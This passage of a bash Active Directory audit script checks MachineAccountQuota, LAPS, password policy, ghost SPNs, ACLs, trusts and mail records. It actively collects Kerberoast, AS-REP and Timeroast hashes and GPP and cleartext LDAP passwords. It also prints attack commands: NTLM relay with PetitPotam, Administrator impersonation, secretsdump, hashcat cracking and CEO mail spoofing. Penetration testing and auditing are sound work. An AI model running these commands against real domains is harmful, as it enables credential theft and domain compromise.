      echo -e "${GREY}          2) ntlmrelayx.py -t ldaps://$DC_IP -wh fakewpad --add-computer --delegate-access${NC}"
      echo -e "${GREY}          3) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
      echo -e "${GREY}          4) getST.py -spn cifs/$DC_FQDN '$DOMAIN/NEWCOMPUTER\$' -impersonate Administrator -dc-ip $DC_IP${NC}"
      echo -e "${GREY}          5) secretsdump.py -k -no-pass '$DOMAIN/Administrator@$DC_FQDN'${NC}"
    fi
  else
    echo -e "${GREEN}[OK] MachineAccountQuota: 0 (Computer creation restricted)${NC}"
  fi
else
  echo -e "${GREY}[--] Could not determine MachineAccountQuota${NC}"
fi

# DCShadow check
if [ -z "$MAQ" ] || [ "$MAQ" -eq 0 ]; then
  echo -e "${GREEN}       └─ DCShadow is not possible (MachineAccountQuota: 0)${NC}"
else
  if [ -x "/root/.local/bin/dacledit.py" ]; then
    DACLEDIT_CMD="/root/.local/bin/dacledit.py"
  elif command -v dacledit.py &>/dev/null; then
    DACLEDIT_CMD="dacledit.py"
  else
    DACLEDIT_CMD=""
  fi
  if [ ! -z "$DACLEDIT_CMD" ]; then
    DCSHADOW_ACE=$($DACLEDIT_CMD -action read -target-dn "$DOMAIN_DN" \
      -dc-ip $DC_IP "$DOMAIN/$AD_USER:$PASSWORD" 2>/dev/null | \
      grep -iE "GenericAll|WriteDacl|DS-Install-Replica|Manage-Topology" | \
      grep -i "$AD_USER")
    if [ ! -z "$DCSHADOW_ACE" ]; then
      echo -e "${RED}       └─ DCShadow preconditions may be met (ACL on domain NC): https://github.com/ShutdownRepo/dcshadow${NC}"
    else
      echo -e "${GREEN}       └─ DCShadow does not appear possible (no critical ACEs on domain NC)${NC}"
    fi
  else
    echo -e "${GREY}       └─ dacledit.py not found, skipping DCShadow ACL check${NC}"
  fi
fi

# Pre-Windows 2000 Default Password Check
PRE2K_DEFAULT_PASS_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M pre2k 2>/dev/null)
if echo "$PRE2K_DEFAULT_PASS_OUTPUT" | grep -q "Found.*pre-created computer accounts"; then
  echo -e "${RED}[KO] Computer account(s) with Pre-Windows 2000 default password still set → pre2k_default_pass.txt${NC}"
  echo "$PRE2K_DEFAULT_PASS_OUTPUT" | grep "Pre-created computer account\|Found.*pre-created" > "$OUTPUT_DIR/pre2k_default_pass.txt"
else
  echo -e "${GREEN}[OK] No computer accounts with Pre-Windows 2000 default password${NC}"
fi

# Pre-Windows 2000 Compatible Access Group
PRE2K_GROUP_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(cn=Pre-Windows 2000 Compatible Access)" member 2>/dev/null)
PRE2K_MEMBERS=$(echo "$PRE2K_GROUP_OUTPUT" | grep "^member:" | awk '{print $2}')
PRE2K_EVERYONE=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-1-0")
PRE2K_ANON=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-5-7")
PRE2K_AUTHUSERS=$(echo "$PRE2K_MEMBERS" | grep -c "S-1-5-11")
if [ "$PRE2K_EVERYONE" -gt 0 ] || [ "$PRE2K_ANON" -gt 0 ]; then
  echo -e "${RED}[KO] Pre-Windows 2000 compatible access contains Everyone/Anonymous → unauthenticated SAMR enumeration possible → pre2k_group.txt${NC}"
  [ "$PRE2K_EVERYONE" -gt 0 ] && echo -e "${RED}       └─ Everyone (S-1-1-0)${NC}"
  [ "$PRE2K_ANON" -gt 0 ] && echo -e "${RED}       └─ Anonymous Logon (S-1-5-7)${NC}"
  echo "$PRE2K_MEMBERS" > "$OUTPUT_DIR/pre2k_group.txt"
elif [ "$PRE2K_AUTHUSERS" -gt 0 ]; then
  echo -e "${RED}[KO] Pre-Windows 2000 compatible access contains Authenticated Users → pre2k_group.txt${NC}"
  echo "$PRE2K_MEMBERS" > "$OUTPUT_DIR/pre2k_group.txt"
else
  echo -e "${GREEN}[OK] Pre-Windows 2000 compatible access group is clean${NC}"
fi

echo ""

# LAPS Check
LAPS_V1=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
  "(name=ms-Mcs-AdmPwd)" name 2>/dev/null | grep -c "name: ms-Mcs-AdmPwd")
LAPS_V2=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
  "(name=msLAPS-Password)" name 2>/dev/null | grep -c "name: msLAPS-Password")

if [ "$LAPS_V1" -eq 0 ] && [ "$LAPS_V2" -eq 0 ]; then
  echo -e "${RED}[KO] LAPS not deployed (neither LAPSv1 nor LAPSv2)${NC}"
else
  if [ "$LAPS_V1" -gt 0 ]; then
    LAPS_READABLE=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M laps 2>/dev/null | grep -v "No result found" | grep -c "Password:")
    if [ "$LAPS_READABLE" -gt 0 ]; then
      echo -e "${RED}[KO] LAPSv1 deployed - passwords readable by current user${NC}"
    else
      echo -e "${GREEN}[OK] LAPSv1 deployed, but current user can't read any passwords${NC}"
    fi
  fi
  if [ "$LAPS_V2" -gt 0 ]; then
    LAPS_V2_READABLE=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M laps --laps-v2 2>/dev/null | grep -v "No result found" | grep -c "Password:")
    if [ "$LAPS_V2_READABLE" -gt 0 ]; then
      echo -e "${RED}[KO] LAPSv2 deployed - passwords readable by current user${NC}"
    else
      echo -e "${GREEN}[OK] LAPSv2 deployed - passwords not readable by current user${NC}"
    fi
  fi
fi

# Password policy
POL_OUT=$(nxc smb "$DC_IP" -u "$AD_USER" -p "$PASSWORD" --pass-pol 2>/dev/null)
MIN_PW_LENGTH=$(echo "$POL_OUT" | grep -i 'Minimum password length' | awk -F: '{print $2}' | tr -d ' ')
LOCKOUT_THRESHOLD=$(echo "$POL_OUT" | grep -i 'Account Lockout Threshold' | awk -F: '{print $2}' | tr -d ' ')
LOCKOUT_WINDOW=$(echo "$POL_OUT" | grep -i 'Reset Account Lockout Counter' | awk -F: '{print $2}' | tr -d ' ')

[ -z "$MIN_PW_LENGTH" ] && MIN_PW_LENGTH="unknown"
[ -z "$LOCKOUT_THRESHOLD" ] && LOCKOUT_THRESHOLD="unknown"
[ -z "$LOCKOUT_WINDOW" ] && LOCKOUT_WINDOW="unknown"

if [ "$MIN_PW_LENGTH" = "unknown" ]; then
  echo -e "${GREY}[--] Minimum password length: unknown${NC}"
else
  if [ "$MIN_PW_LENGTH" -lt 14 ] 2>/dev/null; then
    echo -e "${RED}[KO] Minimum password length: $MIN_PW_LENGTH (<14)${NC}"
  else
    echo -e "${GREEN}[OK] Minimum password length: $MIN_PW_LENGTH${NC}"
  fi
fi

if [ "$LOCKOUT_THRESHOLD" = "unknown" ]; then
  echo -e "${GREY}[--] Account Lockout Threshold: unknown${NC}"
else
  if [ "$LOCKOUT_THRESHOLD" -ge 5 ] 2>/dev/null; then
    echo -e "${GREEN}[OK] Account Lockout Threshold: $LOCKOUT_THRESHOLD (Window: $LOCKOUT_WINDOW)${NC}"
  else
    echo -e "${RED}[KO] Account Lockout Threshold: $LOCKOUT_THRESHOLD (<5)${NC}"
  fi
fi
echo -e "${GREY}       └─ kerbrute passwordspray -d ${DOMAIN} '${OUTPUT_DIR}/domain_users.txt' --user-as-pass${NC}"

# Check for Fine-Grained Password Policies
FGPP_COUNT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Password Settings Container,CN=System,$DOMAIN_DN" \
  "(objectClass=*)" dn 2>/dev/null | \
  grep "^dn: CN=" | grep -v "^dn: CN=Password Settings Container" | wc -l)

if [ "$FGPP_COUNT" -gt 0 ]; then
  echo -e "${GREEN}[OK] $FGPP_COUNT Fine-Grained Password Policies detected (details require elevated privileges)${NC}"
  ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
    -b "CN=Password Settings Container,CN=System,$DOMAIN_DN" \
    "(objectClass=*)" dn 2>/dev/null | \
    grep "^dn: CN=" | grep -v "^dn: CN=Password Settings Container" | \
    sed 's/dn: CN=\([^,]*\).*/\1/' | while read -r policy; do
      echo -e "${GREY}       └─ $policy${NC}"
    done
fi

echo ""

# Ghost SPN Check
GHOST_SPNS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName 2>/dev/null | \
  awk '/^sAMAccountName:/ {comp=$2} /^servicePrincipalName:/ {print comp":"$2}')

if [ ! -z "$GHOST_SPNS" ]; then
  GHOST_COUNT=0
  GHOST_LIST=""
  
  while IFS=: read -r computer spn; do
    if [[ "$spn" =~ ^[^/]+/([^:/]+) ]]; then
      spn_host="${BASH_REMATCH[1]}"
      
      # Skip GUIDs, Azure, Microsoft domains
      [[ "$spn" =~ ^(NtFrs-|Dfsr-) ]] && continue
      [[ "$spn_host" =~ ^[0-9a-f]{8}-[0-9a-f]{4} ]] && continue
      [[ "$spn_host" =~ nsatc\.net$ ]] && continue
      [[ "$spn_host" =~ windows\.net$ ]] && continue
      [[ "$spn_host" =~ microsoft\.com$ ]] && continue
      
      # Normalize computer name
      computer_clean="${computer%\$}"
      computer_clean="${computer_clean,,}"
      
      # Extract hostname from SPN
      spn_hostname="${spn_host%%.*}"
      spn_hostname="${spn_hostname,,}"
      
      # Skip if SPN matches computer name (normal)
      [[ "$spn_hostname" == "$computer_clean" ]] && continue
      
      # Add domain if not FQDN
      if [[ ! "$spn_host" =~ \. ]]; then
        spn_fqdn="${spn_host}.${DOMAIN}"
      else
        spn_fqdn="$spn_host"
      fi
      
      # Check DNS
      DNS_RESULT=$(dig +short +time=2 +tries=2 "$spn_fqdn" @$DC_IP 2>/dev/null)
      
      if [ -z "$DNS_RESULT" ]; then
        GHOST_COUNT=$((GHOST_COUNT + 1))
        GHOST_LIST="${GHOST_LIST}${RED}       └─ ${computer}: ${spn}${NC}\n"
      fi
    fi
  done <<< "$GHOST_SPNS"
  
if [ "$GHOST_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
  printf "$GHOST_LIST"
  if [ ! -z "$MAQ" ] && [ "$MAQ" -gt 0 ]; then
    FIRST_GHOST=$(echo -e "$GHOST_LIST" | head -1 | grep -oP '(?<=TERMSRV/|HOST/|RestrictedKrbHost/|HTTP/)[^$]+' | head -1)
    if [ ! -z "$FIRST_GHOST" ]; then
      GHOST_HOSTNAME=$(echo "$FIRST_GHOST" | cut -d'.' -f1)
      echo -e "${GREY}       └─ addcomputer.py -computer-name '${GHOST_HOSTNAME}\$' -computer-pass 'ComplexPass123!' '$DOMAIN'/'$AD_USER':'$PASSWORD'${NC}"
      echo -e "${GREY}       └─ GetUserSPNs.py '$DOMAIN'/'$AD_USER':'$PASSWORD' -request -dc-ip $DC_IP${NC}"
    fi
  else
    echo -e "${GREY}       └─ Not exploitable: MachineAccountQuota = 0${NC}"
  fi
else
  echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
fi
else
  echo -e "${GREY}[--] Could not enumerate SPNs${NC}"
fi

# Kerberoasting Check
KERBEROAST_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --kerberoasting "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
KERBEROAST_COUNT=$(grep -c '\$krb5tgs\$' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
KERBEROAST_COUNT=${KERBEROAST_COUNT:-0}

if [ "$KERBEROAST_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $KERBEROAST_COUNT Kerberoastable account(s) found → kerberoast.txt${NC}"
  grep -oP '(?<=\*)[^$]+(?=\$)' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
    echo -e "${GREY}       └─ hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"

else
  echo -e "${GREEN}[OK] No Kerberoastable accounts found${NC}"
  rm -f "$OUTPUT_DIR/kerberoast.txt"
fi

# AS-REP Roasting Check
ASREP_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --asreproast "$OUTPUT_DIR/asrep.txt" 2>/dev/null)
ASREP_COUNT=$(grep -c '$krb5asrep$' "$OUTPUT_DIR/asrep.txt" 2>/dev/null || echo 0)

if [ "$ASREP_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $ASREP_COUNT AS-REP roastable account(s) found → asrep.txt${NC}"
  grep -oP '(?<=\$)[^@]+(?=@)' "$OUTPUT_DIR/asrep.txt" 2>/dev/null | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
  echo -e "${GREY}       hashcat -m 18200 asrep.txt wordlist.txt${NC}"
else
  echo -e "${GREEN}[OK] No AS-REP roastable accounts found${NC}"
  rm -f "$OUTPUT_DIR/asrep.txt"
fi

# Timeroasting Check
TIMEROAST_OUTPUT=$(timeout 60 nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M timeroast -o RIDS=500-5000 2>/dev/null)
TIMEROAST_HASHES=$(echo "$TIMEROAST_OUTPUT" | grep -c '\$sntp-ms\$')

if [ "$TIMEROAST_HASHES" -gt 0 ]; then
  echo -e "${RED}[KO] $TIMEROAST_HASHES Timeroastable account(s) found → timeroast.txt${NC}"
  echo "$TIMEROAST_OUTPUT" | grep '\$sntp-ms\$' > "$OUTPUT_DIR/timeroast.txt"
  echo -e "${GREY}       └─ hashcat -m 31300 '$OUTPUT_DIR/timeroast.txt' /usr/share/wordlists/rockyou.txt${NC}"
elif echo "$TIMEROAST_OUTPUT" | grep -qE "STATUS_NOT_SUPPORTED|NTLM.*disabled|Kerberos"; then
  echo -e "${GREY}[--] Timeroasting skipped: NTLM disabled${NC}"
  echo -e "${GREY}       └─ Use Kerberos auth: nxc smb $DC_FQDN -u '$AD_USER' -p '$PASSWORD' -k -M timeroast${NC}"
else
  echo -e "${GREEN}[OK] No Timeroastable accounts found${NC}"
fi

# DES Encryption Check
DES_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(userAccountControl:1.2.840.113556.1.4.803:=2097152)" sAMAccountName 2>/dev/null | \
  grep "^sAMAccountName:" | awk '{print $2}')

DES_COUNT=$(echo "$DES_USERS" | grep -v "^$" | wc -l)

if [ "$DES_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $DES_COUNT user(s) with DES-only Kerberos encryption:${NC}"
  echo "$DES_USERS" | while read -r user; do
    [ ! -z "$user" ] && echo -e "${RED}       └─ $user${NC}"
  done
else
  echo -e "${GREEN}[OK] No users with DES-only Kerberos encryption${NC}"
fi

# Reversible Encryption Check
REV_ENC=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(userAccountControl:1.2.840.113556.1.4.803:=128)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
REV_COUNT=$(echo "$REV_ENC" | grep -v "^$" | wc -l)
if [ "$REV_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $REV_COUNT user(s) with Reversible Encryption enabled${NC}"
  echo "$REV_ENC" | while read -r user; do
    [ -z "$user" ] && continue
    echo -e "${RED}       └─ $user${NC}"
  done
else
  echo -e "${GREEN}[OK] No users with Reversible Encryption enabled${NC}"
fi

# OU ACL GenericWrite / ManageGPLink
OU_ACLS=$(dacledit.py -action read -dc-ip $DC_IP "$FULL_USER:$PASSWORD" -b "$DOMAIN_DN" 2>/dev/null | awk '/Target.*OU=/ { match($0, /OU=[^,]+/); ou=substr($0,RSTART,RLENGTH) } /Access mask/ { mask=$NF } /Trustee \(SID\)/ { trustee=$NF; if (trustee !~ /Domain Admins|Enterprise Admins|Administrators|Local System|SYSTEM|Policies/) { if (mask ~ /GenericWrite|GenericAll|WriteDACL|0xf01ff|0x40000/) { print ou "|" trustee "|" mask } } }' | sort -u)
if [ ! -z "$OU_ACLS" ]; then
  OU_COUNT=$(echo "$OU_ACLS" | grep -v "^$" | wc -l)
  echo -e "${RED}[KO] $OU_COUNT non-default write ACE(s) on Organizational Units → ou_acls.txt${NC}"
  echo "$OU_ACLS" | while IFS='|' read -r ou trustee mask; do
    [ -z "$ou" ] && continue
    echo -e "${RED}       └─ $trustee → $ou ($mask)${NC}"
    echo -e "${GREY}          └─ gPLink poisoning possible (OUned.py) — affects all OU child objects incl. adminCount=1${NC}"
  done
  echo "$OU_ACLS" > "$OUTPUT_DIR/ou_acls.txt"
else
  echo -e "${GREEN}[OK] No non-default write ACEs on Organizational Units${NC}"
fi

# AdminSDHolder ACL
if command -v dacledit.py &>/dev/null; then
  ADMINSDHOLDER_OUTPUT=$(dacledit.py -action read -target-dn "CN=AdminSDHolder,CN=System,$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
  RISKY_ACES=$(echo "$ADMINSDHOLDER_OUTPUT" | awk '
    /ACE\[/ { trustee=""; mask=""; }
    /Access mask/ { match($0, /0x[0-9a-fA-F]+/); mask=substr($0,RSTART,RLENGTH) }
    /Trustee \(SID\)/ {
      sub(/.*Trustee \(SID\)\s*:\s*/, ""); trustee=$0
      if (mask != "" && trustee != "") {
        cmd = "printf \"%d\" " mask
        cmd | getline maskval
        close(cmd)
        if ((maskval+0) >= 262144) {
          if (trustee !~ /Domain Admins|Domänen-Admins|Enterprise Admins|Organisations-Admins|Administrators|Local System|Cert Publishers|Pre-Windows 2000|Terminal Server|Windows Authorization|Principal Self|Everyone|Authenticated Users|SYSTEM|S-1-5-18|S-1-5-32-544/) {
            print trustee
          }
        }
      }
    }
  ' | sort -u)
  if [ ! -z "$RISKY_ACES" ]; then
    RISKY_COUNT=$(echo "$RISKY_ACES" | wc -l)
    echo -e "${RED}[KO] AdminSDHolder: $RISKY_COUNT unexpected Write ACE(s) → SDProp persistence risk${NC}"
    echo "$RISKY_ACES" | while read -r trustee; do
      echo -e "${RED}       └─ $trustee${NC}"
    done
    echo -e "${GREY}       └─ SDProp propagates these ACEs every 60min to all Protected Users${NC}"
    echo -e "${GREY}          dacledit.py -action read -target-dn 'CN=AdminSDHolder,CN=System,$DOMAIN_DN' -dc-ip $DC_IP '$FULL_USER:$PASSWORD'${NC}"
  else
    echo -e "${GREEN}[OK] AdminSDHolder ACLs are clean${NC}"
  fi
else
  echo -e "${GREY}[--] dacledit.py not found, skipping AdminSDHolder check${NC}"
fi

# SID History
SID_HISTORY_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(sIDHistory=*)" sAMAccountName sIDHistory 2>/dev/null)
SID_HISTORY_ACCOUNTS=$(echo "$SID_HISTORY_OUTPUT" | grep "^sAMAccountName:" | awk '{print $2}')
SID_HISTORY_COUNT=$(echo "$SID_HISTORY_ACCOUNTS" | grep -v "^$" | wc -l)
if [ "$SID_HISTORY_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $SID_HISTORY_COUNT account(s) with sIDHistory found → sid_history.txt${NC}"
  echo "$SID_HISTORY_OUTPUT" | grep -E "^(sAMAccountName|sIDHistory):" > "$OUTPUT_DIR/sid_history.txt"
  echo "$SID_HISTORY_ACCOUNTS" | while read -r account; do
    [ -z "$account" ] && continue
    SIDS=$(echo "$SID_HISTORY_OUTPUT" | grep -A5 "sAMAccountName: $account" | grep "^sIDHistory:" | awk '{print $2}')
    echo -e "${RED}       └─ $account${NC}"
    echo "$SIDS" | while read -r sid; do
      echo -e "${GREY}          └─ $sid${NC}"
    done
  done
  echo -e "${GREY}       └─ Verify if SIDs map to privileged groups: bloohound or lookupsid.py $FULL_USER:$PASSWORD@$DC_IP${NC}"
else
  echo -e "${GREEN}[OK] No accounts with sIDHistory found${NC}"
fi

# Shadow Credentials Check
SHADOW_CREDS_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msDS-KeyCredentialLink=*)" sAMAccountName msDS-KeyCredentialLink 2>/dev/null)
SHADOW_CREDS_ACCOUNTS=$(echo "$SHADOW_CREDS_OUTPUT" | grep "^sAMAccountName:" | awk '{print $2}')
SHADOW_CREDS_COUNT=$(echo "$SHADOW_CREDS_ACCOUNTS" | grep -v "^$" | wc -l)
if [ "$SHADOW_CREDS_COUNT" -gt 0 ]; then
  echo "$SHADOW_CREDS_OUTPUT" | grep -E "^(sAMAccountName|msDS-KeyCredentialLink):" > "$OUTPUT_DIR/shadow_creds.txt"
  SHADOW_CREDS_USERS=$(echo "$SHADOW_CREDS_ACCOUNTS" | grep -v '\$$')
  SHADOW_CREDS_COMPUTERS=$(echo "$SHADOW_CREDS_ACCOUNTS" | grep '\$$')
  USER_SC_COUNT=$(echo "$SHADOW_CREDS_USERS" | grep -v "^$" | wc -l)
  COMP_SC_COUNT=$(echo "$SHADOW_CREDS_COMPUTERS" | grep -v "^$" | wc -l)
  if [ "$USER_SC_COUNT" -gt 0 ]; then
    echo -e "${RED}[KO] $USER_SC_COUNT user account(s) with Shadow Credentials (msDS-KeyCredentialLink) → shadow_creds.txt${NC}"
    FIRST_SHADOW_TARGET=$(echo "$SHADOW_CREDS_USERS" | head -1)
    echo -e "${GREY}       └─ pywhisker -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' --target '$FIRST_SHADOW_TARGET' --action list${NC}"
  fi
  if [ "$COMP_SC_COUNT" -gt 0 ]; then
    echo -e "${GREY}       └─ $COMP_SC_COUNT computer account(s) with Shadow Credentials (WHfB/Bitlocker)${NC}"
  fi
else
  echo -e "${GREEN}[OK] No Shadow Credentials found${NC}"
fi

# GPP Passwords (SYSVOL)
GPP_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" --share=SYSVOL -M gpp_password 2>/dev/null)
if echo "$GPP_OUTPUT" | grep -q "Found credentials in" && echo "$GPP_OUTPUT" | grep -qP 'Password:\s+\S+'; then
  echo -e "${RED}[KO] GPP credentials found → gpp_passwords.txt${NC}"
  echo "$GPP_OUTPUT" | grep "Found credentials in" > "$OUTPUT_DIR/gpp_passwords.txt"
else
  echo -e "${GREEN}[OK] No GPP passwords found${NC}"
fi

# Sensitive AD attributes (cleartext passwords in LDAP)
SENSITIVE_ATTRS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(|(userPassword=*)(unixUserPassword=*)(msSFU30Password=*))" \
  sAMAccountName userPassword unixUserPassword msSFU30Password 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
SENSITIVE_COUNT=$(echo "$SENSITIVE_ATTRS" | grep -v "^$" | wc -l)
if [ "$SENSITIVE_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $SENSITIVE_COUNT account(s) with cleartext password in LDAP attributes → sensitive_attrs.txt${NC}"
  echo "$SENSITIVE_ATTRS" | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
  ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
    -b "$DOMAIN_DN" \
    "(|(userPassword=*)(unixUserPassword=*)(msSFU30Password=*))" \
    sAMAccountName userPassword unixUserPassword msSFU30Password 2>/dev/null > "$OUTPUT_DIR/sensitive_attrs.txt"
else
  echo -e "${GREEN}[OK] No cleartext passwords in LDAP attributes${NC}"
fi

echo ""

# Domain Trusts + SID Filtering Check
TRUST_DATA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "CN=System,$DOMAIN_DN" "(objectClass=trustedDomain)" cn trustDirection trustAttributes 2>/dev/null)
TRUST_COUNT=$(echo "$TRUST_DATA" | grep -c "^cn:")
if [ "$TRUST_COUNT" -gt 0 ]; then
  echo -e "${GREY}[--] $TRUST_COUNT Domain Trust(s) found${NC}"
  
echo "$TRUST_DATA" | awk '
    /^cn:/ { cn=$2 }
    /^trustDirection:/ { dir=$2 }
    /^trustAttributes:/ { 
      attr=$2
      if (dir == 1) direction = "Inbound"
      else if (dir == 2) direction = "Outbound"
      else if (dir == 3) direction = "Bidirectional"
      else direction = "Unknown"
      
      is_forest = and(attr, 64)
      if (is_forest) {
        ttype = "Forest"
        sidfilter = and(attr, 4) ? "Yes" : "No"
      } else {
        ttype = "External"
        sidfilter = "Yes"
      }
      printf "%s|%s|%s|%s\n", cn, direction, ttype, sidfilter
    }
  ' | while IFS='|' read -r name direction ttype sidfilter; do
    if [ "$sidfilter" = "No" ]; then
      echo -e "${RED}[KO] $name ($direction $ttype Trust) - SID Filtering: off${NC}"
      echo -e "${RED}       └─ SID History Injection possible${NC}"
    else
      echo -e "${GREEN}[OK] $name ($direction $ttype Trust) - SID Filtering: on${NC}"
    fi
  done
else
  echo -e "${GREEN}[OK] No Domain Trusts found${NC}"
fi

# Foreign Security Principals Check
FSP_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "CN=ForeignSecurityPrincipals,$DOMAIN_DN" "(objectClass=foreignSecurityPrincipal)" cn memberOf 2>/dev/null)
FSP_HITS=$(echo "$FSP_OUTPUT" | awk '
  /^cn:/ { cn=$2 }
  /^memberOf:/ {
    if (cn ~ /^S-1-5-21-/) {
      print cn " → " $0
    }
  }
' | sort -u)
if [ ! -z "$FSP_HITS" ]; then
  FSP_COUNT=$(echo "$FSP_HITS" | wc -l)
  echo -e "${RED}[KO] $FSP_COUNT Foreign Security Principal(s) from trusted domains in groups → fsp.txt${NC}"
  echo "$FSP_HITS" | while read -r line; do
    echo -e "${RED}       └─ $line${NC}"
  done
  echo "$FSP_HITS" > "$OUTPUT_DIR/fsp.txt"
else
  echo -e "${GREEN}[OK] No Foreign Security Principals${NC}"
fi

# Email Security SPF/DMARC, Open Relay
if [[ "$DOMAIN" == *.local || "$DOMAIN" == *.htb ]]; then
  echo -e "${GREY}[--] SPF, DMARC and open relay skipped (.local domain is internal only)${NC}"
else
  SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
  DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
  MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
  
  if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
    echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
  elif [ -z "$SPF_CHECK" ]; then
    echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
  elif [ -z "$DMARC_CHECK" ]; then
    echo -e "${RED}[KO] No DMARC record (SPF present but unenforced — header-from spoofing possible)${NC}"
    echo -e "${GREY}       └─ swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
  else
    echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
  fi
  if command -v swaks &>/dev/null && [ ! -z "$MX_SERVER" ]; then
    OPEN_RELAY=$(swaks --to test@gmail.com --from ceo@$DOMAIN --server $MX_SERVER --timeout 10 --quit-after RCPT 2>&1)
    if echo "$OPEN_RELAY" | grep -q "^-> RCPT" && echo "$OPEN_RELAY" | grep -q "^<-  250"; then
      echo -e "${RED}[KO] Open Relay detected on $MX_SERVER${NC}"
      echo -e "${GREY}       └─ swaks --to target@victim.com --from ceo@$DOMAIN --server $MX_SERVER${NC}"
    else
      echo -e "${GREEN}[OK] No Open Relay on $MX_SERVER${NC}"
    fi
  fi
fi


# GoWitness
echo ""
mkdir -p "$OUTPUT_DIR/screenshots"
> "$OUTPUT_DIR/http_targets.txt"
for target in "${SCAN_TARGETS[@]}"; do
  nmap -p80,443,8080,8443 "$target" --open -oG - 2>/dev/null | awk '/open/{print $2}' | grep -E '^[0-9]' | while read -r ip; do
        echo "http://$ip"
        echo "https://$ip"
      done >> "$OUTPUT_DIR/http_targets.txt"
done
HTTP_COUNT=$([ -f "$OUTPUT_DIR/http_targets.txt" ] && wc -l < "$OUTPUT_DIR/http_targets.txt" || echo 0)
if [ "$HTTP_COUNT" -gt 0 ] && command -v gowitness &>/dev/null; then
  gowitness scan file -f "$OUTPUT_DIR/http_targets.txt" --screenshot-path "$OUTPUT_DIR/screenshots/" --timeout 10 --threads 10 --write-none 2>/dev/null
  SHOT_COUNT=$(ls "$OUTPUT_DIR/screenshots/"*.jpeg 2>/dev/null | wc -l)
  echo -e "${GREEN}[OK] GoWitness captured $SHOT_COUNT screenshot(s) → screenshots/${NC}"
elif ! command -v gowitness &>/dev/null; then
  echo -e "${GREY}[--] GoWitness not found, skipping screenshots${NC}"
else
  echo -e "${GREEN}[OK] No web hosts found in scope (${SCAN_TARGETS[*]})${NC}"
fi

